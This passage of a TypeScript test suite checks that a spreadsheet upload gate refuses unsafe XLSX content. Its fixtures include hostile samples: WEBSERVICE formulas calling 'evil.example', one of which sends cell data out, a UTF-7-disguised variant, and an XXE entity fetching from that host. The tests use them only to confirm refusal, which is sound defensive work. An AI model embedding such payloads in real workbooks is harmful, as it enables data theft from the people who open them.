      hyperlinkIdsOf(SECOND_SHEET_PART, ['rId1']),
    ],
    [
      'a picture past markup the strict lexer refuses, the part with no external hyperlink',
      `<${LONG_S}/><picture r:id="rId1"/>`,
      new Map(),
    ],
  ])('accepts %s', (_label, after, hyperlinks) => {
    expect(
      scanError(entriesOf({ [SHEET_PART]: worksheetWithAfter(after) }), hyperlinks),
    ).toBeNull();
  });
});

// A character reference past U+10FFFF: no character, so the scan cannot decode it.
const UNDECODABLE_REFERENCE = '&#1114112;';

// An attribute value the scan cannot decode is a corrupt part, the error the
// relationships walk gives a Target it cannot decode.
describe('assertSafeXmlContent: attribute values the scan cannot decode', () => {
  it.each<[label: string, after: string, hyperlinks: ExternalHyperlinkIds]>([
    ['any attribute', `<z a="${UNDECODABLE_REFERENCE}"/>`, new Map()],
    ['a style attribute', `<z style="fill:${UNDECODABLE_REFERENCE}"/>`, new Map()],
    ['a src attribute', `<z src="x${UNDECODABLE_REFERENCE}.png"/>`, new Map()],
    [
      'the relationship id of a picture in a part with external hyperlinks',
      `<picture r:id="rId${UNDECODABLE_REFERENCE}"/>`,
      hyperlinkIdsOf(SHEET_PART, ['rId1']),
    ],
  ])('refuses %s as CORRUPT_FILE package-part', (_label, after, hyperlinks) => {
    const error = scanError(entriesOf({ [SHEET_PART]: worksheetWithAfter(after) }), hyperlinks);

    expect(error?.code).toBe('CORRUPT_FILE');
    expect(error?.meta).toEqual({ reason: ZIP_REJECT_REASONS.PACKAGE_PART, entry: SHEET_PART });
  });
});

const NAMESPACE_PART = 'xl/custom/ns.xml';

/** A part whose root holds `count` nested elements, each declaring one namespace. */
function nestedDeclarations(count: number): string {
  return `<r>${'<e xmlns:p="u">'.repeat(count)}${'</e>'.repeat(count)}</r>`;
}

/** A part whose one element declares `count` distinct prefixes. */
function prefixesOnOneElement(count: number): string {
  const declarations = Array.from({ length: count }, (_, index) => ` xmlns:p${index}="u"`);
  return `<r><e${declarations.join('')}/></r>`;
}

/** A part whose root holds `count` sibling elements, each declaring one namespace. */
function siblingDeclarations(count: number): string {
  return `<r>${'<e xmlns:p="u"/>'.repeat(count)}</r>`;
}

function expectTooManyNamespaceDeclarations(
  error: SpreadsheetFileError | null,
  entry = NAMESPACE_PART,
): void {
  expect(error?.code).toBe('UNSAFE_CONTENT');
  expect(error?.meta).toEqual({ entry, cap: MAX_XMLNS_DECLARATIONS_PER_PART });
  expect(error?.message).toBe(
    `Workbook part '${entry}' has more than ${MAX_XMLNS_DECLARATIONS_PER_PART} namespace declarations`,
  );
}

const DRAWING_MAIN_NS = 'http://schemas.openxmlformats.org/drawingml/2006/main';

/**
 * One anchored picture the way Excel 2016+ writes it: three namespace declarations
 * (a16 on the creation id, r on the blip, a14 on useLocalDpi), each out of scope once
 * its element closes.
 */
function excelPicture(index: number): string {
  return (
    '<xdr:twoCellAnchor editAs="oneCell"><xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff>' +
    `<xdr:row>${index}</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>1</xdr:col>` +
    `<xdr:colOff>0</xdr:colOff><xdr:row>${index + 1}</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>` +
    `<xdr:pic><xdr:nvPicPr><xdr:cNvPr id="${index + 2}" name="Picture ${index + 1}"><a:extLst>` +
    '<a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}"><a16:creationId ' +
    `xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{${String(index).padStart(8, '0')}-1111-2222-3333-444444444444}"/>` +
    '</a:ext></a:extLst></xdr:cNvPr><xdr:cNvPicPr><a:picLocks noChangeAspect="1"/></xdr:cNvPicPr></xdr:nvPicPr>' +
    `<xdr:blipFill><a:blip xmlns:r="${OFFICE_RELATIONSHIPS_NS}" r:embed="rId1"><a:extLst>` +
    '<a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}"><a14:useLocalDpi ' +
    'xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/></a:ext></a:extLst>' +
    '</a:blip><a:stretch><a:fillRect/></a:stretch></xdr:blipFill><xdr:spPr><a:xfrm><a:off x="0" y="0"/>' +
    '<a:ext cx="609600" cy="609600"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></xdr:spPr>' +
    '</xdr:pic><xdr:clientData/></xdr:twoCellAnchor>'
  );
}

/** A drawing part holding `count` pictures as Excel 2016+ writes them. */
function drawingWithPictures(count: number): string {
  const pictures = Array.from({ length: count }, (_, index) => excelPicture(index));
  return (
    `${UTF8_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:a="${DRAWING_MAIN_NS}">` +
    `${pictures.join('')}</xdr:wsDr>`
  );
}

/** `inner` inside `depth` levels of elements that declare no namespace. */
function nestedIn(depth: number, inner: string): string {
  return `${'<g>'.repeat(depth)}${inner}${'</g>'.repeat(depth)}`;
}

// The walk keeps the qualified name of every open element up to
// MAX_TRACKED_ELEMENT_DEPTH, and an entry per open element that declares namespaces, so
// its memory is bounded; a part may hold at most MAX_XMLNS_DECLARATIONS_PER_PART
// declarations in scope at once, with the error the reader parts get for more
// declarations in all (they keep that cap on every declaration).
describe('assertSafeXmlContent: namespace declarations', () => {
  it.each([
    ['nested', nestedDeclarations],
    ['on one element', prefixesOnOneElement],
  ])('accepts declarations %s up to the cap and refuses one more', (_label, part) => {
    const atCap = scanError(entriesOf({ [NAMESPACE_PART]: part(MAX_XMLNS_DECLARATIONS_PER_PART) }));
    const overCap = scanError(
      entriesOf({ [NAMESPACE_PART]: part(MAX_XMLNS_DECLARATIONS_PER_PART + 1) }),
    );

    expect(atCap).toBeNull();
    expectTooManyNamespaceDeclarations(overCap);
  });

  it('accepts declarations on sibling elements well past the cap: each leaves scope', () => {
    const part = siblingDeclarations(MAX_XMLNS_DECLARATIONS_PER_PART * 4);

    expect(scanError(entriesOf({ [NAMESPACE_PART]: part }))).toBeNull();
  });

  // A prefix is dropped with its last binding, so distinct prefixes declared one after
  // the other hold no memory; one bound again names its new namespace.
  it('accepts sibling elements that each declare a new prefix, and binds a dropped prefix again', () => {
    const count = MAX_XMLNS_DECLARATIONS_PER_PART * 4;
    const siblings = Array.from({ length: count }, (_, index) => `<e xmlns:p${index}="u"/>`);
    const rebound = `<r><e xmlns:m="${OMML_NS}"/><g xmlns:m="urn:x"><m:f>${EVIL_CALL}</m:f></g></r>`;

    expect(scanError(entriesOf({ [NAMESPACE_PART]: `<r>${siblings.join('')}</r>` }))).toBeNull();
    expectUnsafeFormula(scanError(entriesOf({ [NAMESPACE_PART]: rebound })), NAMESPACE_PART);
  });

  it.each([85, 500])('accepts a drawing with %i pictures as Excel 2016+ writes them', (count) => {
    expect(scanError(entriesOf({ [DRAWING_PART]: drawingWithPictures(count) }))).toBeNull();
  });

  it('keeps the cap on every declaration of a part the reader opens, at the gate', () => {
    const siblings = '<e xmlns:p="u"/>'.repeat(MAX_XMLNS_DECLARATIONS_PER_PART + 1);
    const readerPart = buildXlsxFixture([{ name: 'Sheet1', xml: worksheetWithAfter(siblings) }]);
    const otherPart = buildXlsxFixture([{ name: 'Sheet1', xml: worksheetWithCell('<v>1</v>') }], {
      [DRAWING_PART]: drawingWith(siblings),
    });

    expectTooManyNamespaceDeclarations(gateError(readerPart), SHEET_PART);
    expect(gateError(otherPart)).toBeNull();
  });

  it('counts the declarations past nesting the walk cannot follow', () => {
    const part = `<a></a></b>${siblingDeclarations(MAX_XMLNS_DECLARATIONS_PER_PART + 1)}`;

    expectTooManyNamespaceDeclarations(scanError(entriesOf({ [NAMESPACE_PART]: part })));
  });

  it('follows the bindings through nesting up to the depth it tracks', () => {
    // The root and the fraction's own five levels stay within the tracked depth.
    const depth = MAX_TRACKED_ELEMENT_DEPTH - 8;
    const fraction = `<r xmlns:m="${OMML_NS}">${nestedIn(depth, OMML_FRACTION)}</r>`;
    const afterClose = `<r><a xmlns:m="${OMML_NS}">${nestedIn(depth, '')}</a><m:f>${EVIL_CALL}</m:f></r>`;

    expect(scanError(entriesOf({ [NAMESPACE_PART]: fraction }))).toBeNull();
    expectUnsafeFormula(scanError(entriesOf({ [NAMESPACE_PART]: afterClose })), NAMESPACE_PART);
  });

  it('reads every f as a field past the depth it tracks', () => {
    const fraction = (depth: number): string =>
      `<r xmlns:m="${OMML_NS}">${nestedIn(depth, OMML_FRACTION)}</r>`;

    expectUnsafeFormula(
      scanError(entriesOf({ [NAMESPACE_PART]: fraction(MAX_TRACKED_ELEMENT_DEPTH) })),
      NAMESPACE_PART,
    );
    expectUnsafeFormula(
      scanError(entriesOf({ [NAMESPACE_PART]: fraction(100_000) })),
      NAMESPACE_PART,
    );
  });

  it('pins the tracked depth', () => {
    expect(MAX_TRACKED_ELEMENT_DEPTH).toBe(512);
  });
});

/** `xml` (which starts with the UTF-8 declaration) with `declaration` in its place. */
function withDeclaration(xml: string, declaration: string): string {
  return declaration + xml.slice(UTF8_DECLARATION.length);
}

/** `text` encoded UTF-16LE, preceded by the byte order mark FF FE when `bom`. */
function utf16le(text: string, bom: boolean): Uint8Array<ArrayBuffer> {
  const start = bom ? 2 : 0;
  const bytes = new Uint8Array(start + text.length * 2);
  if (bom) bytes.set([0xff, 0xfe]);
  for (let index = 0; index < text.length; index += 1) {
    const code = text.charCodeAt(index);
    bytes[start + index * 2] = code % 0x100;
    bytes[start + index * 2 + 1] = Math.floor(code / 0x100);
  }
  return bytes;
}

/** UTF-8 bytes of `before`, the single byte `byte`, then UTF-8 bytes of `after`. */
function withRawByte(before: string, byte: number, after: string): Uint8Array<ArrayBuffer> {
  const head = strToU8(before);
  const tail = strToU8(after);
  const bytes = new Uint8Array(head.length + 1 + tail.length);
  bytes.set(head);
  bytes[head.length] = byte;
  bytes.set(tail, head.length + 1);
  return bytes;
}

// A UTF-7 encoder writes 'W' as `+AFc-` and '"' as `+ACI-`.
const UTF7_WEBSERVICE_FORMULA = '<f>+AFc-EBSERVICE(+ACI-http://evil.example+ACI-)</f>';
const EVIL_FORMULA = '<f>WEBSERVICE("http://evil.example")</f>';
const INVALID_UTF8_LEAD_BYTE = 0xc0;

function expectPartEncoding(error: SpreadsheetFileError | null, entry = SHEET_PART): void {
  expect(error?.code).toBe('CORRUPT_FILE');
  expect(error?.meta).toEqual({ reason: ZIP_REJECT_REASONS.PART_ENCODING, entry });
}

describe('assertSafeXmlContent: every kept XML part is UTF-8 text', () => {
  it.each([
    ['a UTF-7 declaration', '<?xml version="1.0" encoding="UTF-7"?>'],
    ['a UTF-16 declaration', '<?xml version="1.0" encoding="UTF-16"?>'],
    ['an ISO-8859-1 declaration', '<?xml version="1.0" encoding="ISO-8859-1"?>'],
    ['a declaration target in another case', '<?XML version="1.0" encoding="UTF-7"?>'],
    ['a declaration the lexer cannot read', '<?xml version="1.0" encoding=UTF-7?>'],
  ])('refuses %s as CORRUPT_FILE part-encoding', (_label, declaration) => {
    const xml = withDeclaration(worksheetWithFormula(UTF7_WEBSERVICE_FORMULA), declaration);

    expectPartEncoding(scanError(entriesOf({ [SHEET_PART]: xml })));
  });

  it('refuses an invalid UTF-8 byte inside a name as CORRUPT_FILE part-encoding', () => {
    const xml = worksheetWithFormula('<f>WEB|SERVICE("http://evil.example")</f>');
    const [before = '', after = ''] = xml.split('|');

    expectPartEncoding(
      scanError({ [SHEET_PART]: withRawByte(before, INVALID_UTF8_LEAD_BYTE, after) }),
    );
  });

  it.each([
    ['with a byte order mark', true],
    ['without a byte order mark', false],
  ])('refuses a UTF-16LE part %s as CORRUPT_FILE part-encoding', (_label, bom) => {
    const xml = withDeclaration(
      worksheetWithFormula(EVIL_FORMULA),
      '<?xml version="1.0" encoding="UTF-16"?>',
    );

    expectPartEncoding(scanError({ [SHEET_PART]: utf16le(xml, bom) }));
  });

  it('checks a part that is not a worksheet too', () => {
    const xml = withDeclaration(
      `${UTF8_DECLARATION}<sst xmlns="${SPREADSHEET_NS}"/>`,
      '<?xml version="1.0" encoding="UTF-7"?>',
    );

    expectPartEncoding(scanError(entriesOf({ [SHARED_STRINGS_PART]: xml })), SHARED_STRINGS_PART);
  });

  it.each([
    ['a lower-case utf-8 declaration', '<?xml version="1.0" encoding="utf-8"?>'],
    ['a declaration without an encoding', '<?xml version="1.0" standalone="yes"?>'],
    ['no declaration', ''],
  ])('accepts %s', (_label, declaration) => {
    const xml = withDeclaration(worksheetWithFormula('<f>SUM(A1:A2)</f>'), declaration);

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('accepts a byte order mark before the declaration', () => {
    const xml = `${BYTE_ORDER_MARK}${worksheetWithFormula('<f>SUM(A1:A2)</f>')}`;

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });
});

const CLEAN_SHEET = worksheetWithCell('<v>1</v>');
const EVIL_SHEET = worksheetWithFormula(EVIL_FORMULA);
const RELATIONSHIPS_NS = 'http://schemas.openxmlformats.org/package/2006/relationships';
const WORKSHEET_REL_TYPE =
  'http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet';
const FIRST_SHEET: XlsxFixtureSheet = { name: 'Sheet1', xml: CLEAN_SHEET };

/** Workbook rels naming sheet1 with the worksheet type and sheet2 with `secondType`. */
function relsWithSecondSheetType(secondType: string): string {
  return (
    `${UTF8_DECLARATION}<Relationships xmlns="${RELATIONSHIPS_NS}">` +
    `<Relationship Id="rId1" Type="${WORKSHEET_REL_TYPE}" Target="worksheets/sheet1.xml"/>` +
    `<Relationship Id="rId2" Type="${secondType}" Target="worksheets/sheet2.xml"/>` +
    '</Relationships>'
  );
}

/** Two sheets, the second holding `secondXml` and named by a relationship of `secondType`. */
function bookWithSecondSheetType(secondType: string, secondXml: string): Buffer {
  return buildXlsxFixture([FIRST_SHEET, { name: 'S2', xml: secondXml }], {
    [WORKBOOK_RELS_PART]: relsWithSecondSheetType(secondType),
  });
}

// The reader opens only the worksheets a relationship of exactly the transitional type
// names, at the entry its Target maps to; the export hands every part on unchanged, so
// the gate scans every kept XML part whatever the relationships say.
describe('upload gate: every kept worksheet part is scanned', () => {
  it.each([
    [
      'the Strict worksheet type',
      'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet',
    ],
    [
      'the worksheet type in another case',
      `${WORKSHEET_REL_TYPE.slice(0, -'worksheet'.length)}Worksheet`,
    ],
    ['the worksheet type with a trailing space', `${WORKSHEET_REL_TYPE} `],
  ])('refuses a formula in a second sheet named by %s', (_label, type) => {
    expectUnsafeFormula(gateError(bookWithSecondSheetType(type, EVIL_SHEET)), SECOND_SHEET_PART);
  });

  // The reader would read a clean sheet at the alias entry and Excel the formula at the
  // entry the alias resolves to; the entry name rule now refuses the alias entry by its
  // name, before anything is scanned.
  it.each([
    ['./worksheets/sheet2.xml', 'xl/./worksheets/sheet2.xml'],
    ['worksheets/sheet%32.xml', 'xl/worksheets/sheet%32.xml'],
  ])(
    'refuses the entry a Target alias %s names by its name, a formula beside it',
    (relTarget, partPath) => {
      const file = buildXlsxFixture(
        [FIRST_SHEET, { name: 'S2', xml: CLEAN_SHEET, partPath, relTarget }],
        { [SECOND_SHEET_PART]: EVIL_SHEET },
      );

      const error = gateError(file);
      expect(error?.code).toBe('CORRUPT_FILE');
      expect(error?.meta).toEqual({ reason: ZIP_REJECT_REASONS.ENTRY_NAME, entry: partPath });
    },
  );

  it('refuses a formula in a part whose root is a worksheet of any namespace, at any path', () => {
    const xml =
      `${UTF8_DECLARATION}<w:worksheet xmlns:w="urn:other"><w:sheetData><w:row r="1">` +
      `<w:c r="A1">${EVIL_FORMULA.replaceAll('f>', 'w:f>')}</w:c></w:row></w:sheetData>` +
      '</w:worksheet>';
    const file = buildXlsxFixture([FIRST_SHEET], { 'xl/x/a.xml': xml });

    expectUnsafeFormula(gateError(file), 'xl/x/a.xml');
  });

  it('refuses it on the read and the patch path alike', () => {
    const file = bookWithSecondSheetType(
      'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet',
      EVIL_SHEET,
    );
    const sheet = { by: 'name', name: 'Sheet1' } as const;
    const read = (): unknown => readUploadGrid(file, resolveReadOptions({ sheet }));
    const patch = (): Buffer =>
      patchFixture(file, [{ excelRow: 1, col: 0, value: { kind: 'number', value: '5' } }], {
        sheet,
      });

    expectUnsafeFormula(fileErrorOf(read), SECOND_SHEET_PART);
    expectUnsafeFormula(fileErrorOf(patch), SECOND_SHEET_PART);
  });

  it('accepts a clean worksheet no relationship names, and one named by the Strict type', () => {
    const safeSheet = worksheetWithFormula('<f>SUM(A1:A2)</f>');
    const unnamed = buildXlsxFixture([FIRST_SHEET], { 'xl/worksheets/sheet9.xml': safeSheet });
    const strict = bookWithSecondSheetType(
      'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet',
      safeSheet,
    );

    expect(gateError(unnamed)).toBeNull();
    expect(gateError(strict)).toBeNull();
  });

  it('refuses a formula past a quoted sheet name holding a quote, on any sheet', () => {
    const formula =
      "<f>'a&quot;b'!A1&amp;WEBSERVICE(&quot;http://evil.example/?d=&quot;&amp;A2)</f>";
    const onSecond = buildXlsxFixture([
      FIRST_SHEET,
      { name: 'a"b', xml: worksheetWithFormula(formula) },
    ]);
    const onFirst = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetWithFormula(formula) },
      { name: 'a"b', xml: CLEAN_SHEET },
    ]);

    expectUnsafeFormula(gateError(onSecond), SECOND_SHEET_PART);
    expectUnsafeFormula(gateError(onFirst));
  });

  it('refuses a second sheet declaring UTF-7 as CORRUPT_FILE part-encoding', () => {
    const utf7Sheet = withDeclaration(
      worksheetWithFormula(UTF7_WEBSERVICE_FORMULA),
      '<?xml version="1.0" encoding="UTF-7"?>',
    );
    const file = buildXlsxFixture([FIRST_SHEET, { name: 'S2', xml: utf7Sheet }]);

    expectPartEncoding(gateError(file), SECOND_SHEET_PART);
  });

  it('accepts all eight api fixtures', () => {
    for (const fixture of API_FIXTURES) {
      expect(gateError(readFixture(fixture)), fixture).toBeNull();
    }
  });
});

/** `text` as bytes: each code unit one byte (every code unit here is below 0x100). */
const HYPERLINK_REL_TYPE = `${OFFICE_RELATIONSHIPS_NS}/hyperlink`;

const SHEET_RELS_PART = 'xl/worksheets/_rels/sheet1.xml.rels';
const WEB_HYPERLINK_RELATIONSHIP = `<Relationship Id="rId1" Type="${HYPERLINK_REL_TYPE}" Target="https://www.example.com/urun/123" TargetMode="External"/>`;
const IMAGE_RELATIONSHIP = `<Relationship Id="rId1" Type="${OFFICE_RELATIONSHIPS_NS}/image" Target="../media/image1.png"/>`;

/**
 * A one-sheet workbook whose hyperlink has the relationship id `id` and keeps
 * `location`, the sheet's relationships part holding `relationships` (none when null).
 */
function bookWithSheetHyperlink(
  id: string,
  location: string,
  relationships: string | null,
): Buffer {
  const parts: Record<string, string> =
    relationships === null
      ? {}
      : {
          [SHEET_RELS_PART]: `${UTF8_DECLARATION}<Relationships xmlns="${RELATIONSHIPS_NS}">${relationships}</Relationships>`,
        };
  return buildXlsxFixture(
    [{ name: 'Sheet1', xml: worksheetWithAfter(hyperlinkWith(`r:id="${id}"`, location)) }],
    parts,
  );
}

/** A one-sheet workbook whose hyperlink leads to a web page and keeps `location`. */
function bookWithWebHyperlink(location: string): Buffer {
  return bookWithSheetHyperlink('rId1', location, WEB_HYPERLINK_RELATIONSHIP);
}

describe('upload gate: hyperlinks to web pages', () => {
  it.each(URL_FRAGMENTS)('accepts the URL fragment %s in the location', (location) => {
    expect(gateError(bookWithWebHyperlink(location))).toBeNull();
  });

  it.each<[label: string, id: string, relationships: string | null]>([
    ['an id its relationships part lacks', 'rId99', WEB_HYPERLINK_RELATIONSHIP],
    ['an id while the sheet has no relationships part', 'rId1', null],
    [
      'an internal hyperlink',
      'rId1',
      `<Relationship Id="rId1" Type="${HYPERLINK_REL_TYPE}" Target="#Sheet1!A1"/>`,
    ],
    ['an image', 'rId1', IMAGE_RELATIONSHIP],
    [
      'an external hyperlink and an image',
      'rId1',
      `${WEB_HYPERLINK_RELATIONSHIP}${IMAGE_RELATIONSHIP}`,
    ],
  ])(
    'scans the location of a hyperlink whose relationship id names %s as a formula',
    (_label, id, relationships) => {
      expectUnsafeFormula(gateError(bookWithSheetHyperlink(id, EVIL_CALL, relationships)));
    },
  );

  it('refuses a sheet background picture that names an external hyperlink', () => {
    const file = buildXlsxFixture(
      [{ name: 'Sheet1', xml: worksheetWithAfter('<picture r:id="rId1"/>') }],
      {
        [SHEET_RELS_PART]: `${UTF8_DECLARATION}<Relationships xmlns="${RELATIONSHIPS_NS}">${WEB_HYPERLINK_RELATIONSHIP}</Relationships>`,
      },
    );

    expectUnsafePart(gateError(file));
  });

  /** A one-sheet workbook whose sheet holds `element` after its data, and whose relationships part holds `relationship`. */
  function bookWithSheetElement(element: string, relationship: string): Buffer {
    return buildXlsxFixture([{ name: 'Sheet1', xml: worksheetWithAfter(element) }], {
      [SHEET_RELS_PART]: `${UTF8_DECLARATION}<Relationships xmlns="${RELATIONSHIPS_NS}">${relationship}</Relationships>`,
    });
  }

  const SHEET_ID_ELEMENTS: readonly string[] = ['picture', 'legacyDrawing'];

  it.each(SHEET_ID_ELEMENTS)('refuses a sheet %s that names an external hyperlink', (element) => {
    expectUnsafePart(
      gateError(bookWithSheetElement(`<${element} r:id="rId1"/>`, WEB_HYPERLINK_RELATIONSHIP)),
    );
  });

  // The TargetMode is read once, for the external target rule and for the hyperlink ids
  // alike: a spelling other than Internal or External, which a reader may still take for
  // External, is refused instead of passing one rule and missing the other.
  it.each(
    ['external', 'EXTERNAL', 'External '].flatMap((mode) =>
      SHEET_ID_ELEMENTS.map((element) => [mode, element]),
    ),
  )(
    'refuses TargetMode="%s" on the hyperlink a sheet %s names as CORRUPT_FILE package-part',
    (mode, element) => {
      const relationship = WEB_HYPERLINK_RELATIONSHIP.replace(
        'TargetMode="External"',
        `TargetMode="${mode}"`,
      );
      const error = gateError(bookWithSheetElement(`<${element} r:id="rId1"/>`, relationship));

      expect(error?.code).toBe('CORRUPT_FILE');
      expect(error?.meta).toEqual({
        reason: ZIP_REJECT_REASONS.PACKAGE_PART,
        entry: SHEET_RELS_PART,
      });
    },
  );

  it('refuses a relationship Id holding a TAB as CORRUPT_FILE package-part', () => {
    const relationship = WEB_HYPERLINK_RELATIONSHIP.replace('Id="rId1"', 'Id="rId\t1"');
    const error = gateError(bookWithSheetElement('<picture r:id="rId 1"/>', relationship));

    expect(error?.code).toBe('CORRUPT_FILE');
    expect(error?.meta).toEqual({
      reason: ZIP_REJECT_REASONS.PACKAGE_PART,
      entry: SHEET_RELS_PART,
    });
  });

  // An XML processor reads a literal LF, CR LF pair, CR or TAB in an attribute value as
  // one space, so `r:id` written with a line break names the Id written with a space.
  it.each([
    ['an LF', 'rId\n1'],
    ['a CR LF pair', 'rId\r\n1'],
    ['a CR', 'rId\r1'],
    ['a TAB', 'rId\t1'],
  ])('refuses a sheet picture whose r:id holds %s naming an external hyperlink', (_label, id) => {
    const relationship = WEB_HYPERLINK_RELATIONSHIP.replace('Id="rId1"', 'Id="rId 1"');

    expectUnsafePart(gateError(bookWithSheetElement(`<picture r:id="${id}"/>`, relationship)));
  });
});

// `<?xml version` in EBCDIC (code page 037): its first four bytes are the signature an
// XML reader detects EBCDIC by.
const EBCDIC_DECLARATION = '\x4c\x6f\xa7\x94\x93\x40\xa5\x85\x99\xa2\x89\x96\x95';

function latin1Bytes(text: string): Uint8Array<ArrayBuffer> {
  return Uint8Array.from(text, (character) => character.charCodeAt(0));
}

// What the first bytes of an entry say it holds; the gate keeps and scans XML whatever
// the entry's name.
describe('entryContentKind', () => {
  it.each<[label: string, bytes: Uint8Array, kind: EntryContentKind]>([
    ['an XML declaration', strToU8(UTF8_DECLARATION), 'xml'],
    ['a root element', strToU8('<a/>'), 'xml'],
    ['white space, then a root element', strToU8(' \r\n\t<a/>'), 'xml'],
    ['a UTF-8 byte order mark, then a root element', latin1Bytes('\xef\xbb\xbf<a/>'), 'xml'],
    ['a lone <', strToU8('<'), 'xml'],
    ['an image', latin1Bytes('\x89PNG\r\n'), 'other'],
    ['text', strToU8('png'), 'other'],
    ['nothing', new Uint8Array(0), 'other'],
    ['white space only', strToU8('   '), 'other'],
    ['a UTF-16 little-endian byte order mark', latin1Bytes('\xff\xfe<\x00a\x00'), 'misencoded'],
    ['a UTF-16 big-endian byte order mark', latin1Bytes('\xfe\xff\x00<\x00a'), 'misencoded'],
    ['a UTF-32 big-endian byte order mark', latin1Bytes('\x00\x00\xfe\xff'), 'misencoded'],
    ['UTF-16 little endian without a mark', latin1Bytes('<\x00?\x00'), 'misencoded'],
    ['UTF-16 big endian without a mark', latin1Bytes('\x00<\x00?'), 'misencoded'],
    ['UTF-32 big endian without a mark', latin1Bytes('\x00\x00\x00<'), 'misencoded'],
    ['white space and U+0000 before <', latin1Bytes(' \x00<\x00'), 'misencoded'],
    ['an EBCDIC XML declaration', latin1Bytes(EBCDIC_DECLARATION), 'misencoded'],
    ['the EBCDIC signature alone', latin1Bytes('\x4c\x6f\xa7\x94'), 'misencoded'],
  ])('reads %s', (_label, bytes, kind) => {
    expect(entryContentKind(bytes)).toBe(kind);
  });

  it('reads the same kind byte by byte as whole', () => {
    for (const text of [
      '<a/>',
      '\xef\xbb\xbf<a/>',
      '  png',
      '\xff\xfe<\x00',
      '\x00<',
      '<',
      EBCDIC_DECLARATION,
    ]) {
      const bytes = latin1Bytes(text);
      const sniff = createEntryContentSniff();
      for (const byte of bytes) feedEntryContentSniff(sniff, Uint8Array.of(byte));
      expect(finishEntryContentSniff(sniff), JSON.stringify(text)).toBe(entryContentKind(bytes));
    }
  });
});

describe('assertSafeXmlContent: entries chosen by content', () => {
  it.each([
    'xl/drawings/vmlDrawing1.vml',
    'xl/theme/theme1.xml',
    'xl/x/_rels/a.bin.rels',
    'xl/A.VML',
  ])('refuses %s holding no XML as CORRUPT_FILE part-encoding', (entry) => {
    expectPartEncoding(scanError(entriesOf({ [entry]: 'not xml' })), entry);
  });

  it('refuses an EBCDIC entry whatever its name as CORRUPT_FILE part-encoding', () => {
    const entry = 'xl/worksheets/sheet2.dat';

    expectPartEncoding(scanError({ [entry]: latin1Bytes(EBCDIC_DECLARATION) }), entry);
  });

  it('refuses a UTF-16 entry whatever its name as CORRUPT_FILE part-encoding', () => {
    const entry = 'xl/worksheets/sheet2.bin';
    const xml = withDeclaration(
      worksheetWithFormula(EVIL_FORMULA),
      '<?xml version="1.0" encoding="UTF-16"?>',
    );

    expectPartEncoding(scanError({ [entry]: utf16le(xml, true) }), entry);
  });

  it.each(['xl/worksheets/sheet2.bin', 'xl/worksheets/sheet2', 'xl/worksheets/sheet2.XML'])(
    'scans XML stored as %s',
    (entry) => {
      expectUnsafeFormula(scanError(entriesOf({ [entry]: EVIL_SHEET })), entry);
    },
  );

  it('scans a VML drawing: a DOCTYPE refuses', () => {
    const vml = '<!DOCTYPE x [<!ENTITY e SYSTEM "http://evil.example/x">]><xml>&e;</xml>';

    expect(scanError(entriesOf({ 'xl/drawings/vmlDrawing1.vml': vml }))?.code).toBe(
      'UNSAFE_CONTENT',
    );
  });

  it('leaves out an entry that holds no XML under a name that promises none', () => {
    const entries = {
      'xl/media/image1.png': latin1Bytes('\x89PNG\r\n'),
      'xl/printerSettings/printerSettings1.bin': strToU8('binary'),
    };

    expect(scanError(entries)).toBeNull();
  });
});

describe('isXmlPart', () => {
  // The reader opens only entries named .xml or .xml.rels.
  it.each([
    ['[Content_Types].xml', true],
    ['xl/worksheets/sheet1.xml', true],
    ['xl/_rels/workbook.xml.rels', true],
    ['_rels/.rels', false],
    ['xl/media/image1.png', false],
    ['xl/worksheets/sheet1.XML', false],
  ])('%s -> %s', (name, expected) => {
    expect(isXmlPart(name)).toBe(expected);
  });
});
